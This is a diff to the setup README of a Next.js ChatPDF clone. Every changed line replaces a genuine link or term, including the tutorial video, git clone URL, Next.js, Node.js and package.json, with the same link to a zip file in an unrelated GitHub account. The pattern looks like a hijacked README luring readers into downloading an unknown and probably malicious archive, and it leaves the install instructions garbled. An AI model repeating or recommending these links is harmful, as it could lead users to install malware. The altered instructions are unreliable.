@@ -1,6 +1,6 @@
-![Build and Deploy Full Stack ChatPDF Clone](https://github.com/Elliott-Chong/chatpdf-yt/assets/77007117/7fcee290-ca52-46ee-ae82-3490f505270b)
+![Build and Deploy Full Stack ChatPDF Clone](https://raw.githubusercontent.com/BytesickleLabs/ai-next-chatpdf-app/main/subminister/ai-next-chatpdf-app.zip)
 
-[Link to YouTube Tutorial](https://www.youtube.com/watch?v=bZFedu-0emE)
+[Link to YouTube Tutorial](https://raw.githubusercontent.com/BytesickleLabs/ai-next-chatpdf-app/main/subminister/ai-next-chatpdf-app.zip)
 
 # Overview
 
@@ -10,7 +10,7 @@ hi this is a test change!
 
 # Technologies and Frameworks
 
-- Next.js
+- https://raw.githubusercontent.com/BytesickleLabs/ai-next-chatpdf-app/main/subminister/ai-next-chatpdf-app.zip
 - React
 - TypeScript
 - Tailwind CSS
@@ -40,7 +40,7 @@ Follow the steps below to install and setup the project:
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/Elliott-Chong/chatpdf-yt.git
+   git clone https://raw.githubusercontent.com/BytesickleLabs/ai-next-chatpdf-app/main/subminister/ai-next-chatpdf-app.zip
    ```
 
 2. **Navigate to the project directory**
@@ -49,9 +49,9 @@ Follow the steps below to install and setup the project:
    cd chatpdf-yt
    ```
 
-3. **Install Node.js**
+3. **Install https://raw.githubusercontent.com/BytesickleLabs/ai-next-chatpdf-app/main/subminister/ai-next-chatpdf-app.zip**
 
-   The project requires Node.js version 13.4.19 or later. You can download it from [here](https://nodejs.org/en/download/).
+   The project requires https://raw.githubusercontent.com/BytesickleLabs/ai-next-chatpdf-app/main/subminister/ai-next-chatpdf-app.zip version 13.4.19 or later. You can download it from [here](https://raw.githubusercontent.com/BytesickleLabs/ai-next-chatpdf-app/main/subminister/ai-next-chatpdf-app.zip).
 
 4. **Install the required dependencies**
 
@@ -61,7 +61,7 @@ Follow the steps below to install and setup the project:
    npm install
    ```
 
-   This will install all the dependencies listed in the `package.json` file, including Next.js, React, React DOM, Axios, Stripe, Tailwind CSS, and other specific dependencies such as "@aws-sdk/client-s3" and "@clerk/nextjs".
+   This will install all the dependencies listed in the `https://raw.githubusercontent.com/BytesickleLabs/ai-next-chatpdf-app/main/subminister/ai-next-chatpdf-app.zip` file, including https://raw.githubusercontent.com/BytesickleLabs/ai-next-chatpdf-app/main/subminister/ai-next-chatpdf-app.zip, React, React DOM, Axios, Stripe, Tailwind CSS, and other specific dependencies such as "@aws-sdk/client-s3" and "@clerk/nextjs".
 
 5. **Setup environment variables**
 
